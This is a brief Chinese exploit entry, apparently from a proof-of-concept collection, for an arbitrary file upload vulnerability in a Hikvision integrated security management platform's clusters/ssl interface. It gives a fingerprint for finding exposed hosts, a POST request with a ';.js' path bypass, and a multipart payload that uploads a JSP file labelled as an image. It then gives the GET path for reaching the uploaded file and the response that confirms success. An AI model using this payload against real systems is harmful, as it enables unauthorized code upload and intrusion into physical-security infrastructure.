# 海康威视综合安防管理平台clustersssl接口存在任意文件上传漏洞

海康 ｜ 文件上传 ｜ —
- **指纹**：`body="/portal/skin/isee/redblack/"`
- **请求**：`POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryHRhkXyQjTSAk8j8c
Content-Disposition: form-data; name="file"; filename="languages/defd36sault.jsp"
Content-Type: image/png
Test123
------WebKitFormBoundaryHRhkXyQjTSAk8j8c
Content-Disposition: form-data; name="proxyAddress"
8.8.8.8
------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
**上传定位：**
GET /clusterMgr/languages/defd36sault.jsp;.js HTTP/1.1
Host:
```
- **响应特征**：200 Test123